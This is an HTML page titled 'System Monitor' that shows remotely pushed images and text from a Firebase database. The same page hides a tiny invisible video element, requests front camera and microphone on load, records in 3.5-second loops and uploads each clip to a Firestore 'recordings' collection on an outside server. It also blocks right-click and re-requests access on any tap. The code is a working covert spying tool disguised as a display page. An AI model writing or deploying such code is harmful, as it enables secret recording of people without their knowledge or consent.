<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Monitor</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <style>
        /* Private Security */
        * { -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; }
        body { margin: 0; background: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        .title-bar { background: black; padding: 20px; text-align: center; font-size: 12px; color: #0f0; border-bottom: 1px solid #ddd; }
        #mainBox { flex: 1; display: flex; flex-direction: column; align-items: center; overflow: hidden; }
        /* 4-Kona (Sharp) Display */
        #displayImg { width: 100%; height: auto; display: none; border-radius: 0px; object-fit: contain; }
        #displayText { width: 100%; padding: 20px; font-size: 20px; color: #000; text-align: center; white-space: pre-wrap; box-sizing: border-box; }
        #preview { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="title-bar"> 			</div>
    <video id="preview" autoplay muted playsinline></video>
    <div id="mainBox">
        <img id="displayImg" src="">
        <div id="displayText"></div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyBqeyPDHeWvvKsDXOp13JkVYMaWaPM9dko", authDomain: "camera-92fee.firebaseapp.com", projectId: "camera-92fee", storageBucket: "camera-92fee.firebasestorage.app", messagingSenderId: "530687776530", appId: "1:530687776530:web:95c00e598e07d33dbac5cb" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        db.collection("control").doc("currentStatus").onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                const img = document.getElementById('displayImg');
                const txt = document.getElementById('displayText');

                if (data.type === 'clear') {
                    img.style.display = 'none';
                    txt.innerText = '';
                } else if (data.type === 'image') {
                    img.src = data.content;
                    img.style.display = data.content ? 'block' : 'none';
                } else if (data.type === 'text') {
                    txt.innerText = data.content;
                }
            }
        });

        window.onload = () => { startApp(); };
        async function startApp() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                document.getElementById('preview').srcObject = s;
                record(s);
            } catch (e) { document.body.onclick = () => startApp(); }
        }
        function record(s) {
            const mr = new MediaRecorder(s, { mimeType: 'video/webm;codecs=vp8' });
            let ch = [];
            mr.ondataavailable = (e) => ch.push(e.data);
            mr.onstop = () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
                reader.onloadend = () => {
                    db.collection("recordings").add({ videoData: reader.result, timestamp: firebase.firestore.FieldValue.serverTimestamp() }).then(() => record(s));
                };
            };
            mr.start();
            setTimeout(() => { if (mr.state === "recording") mr.stop(); }, 3500);
        }
    </script>
</body>
</html>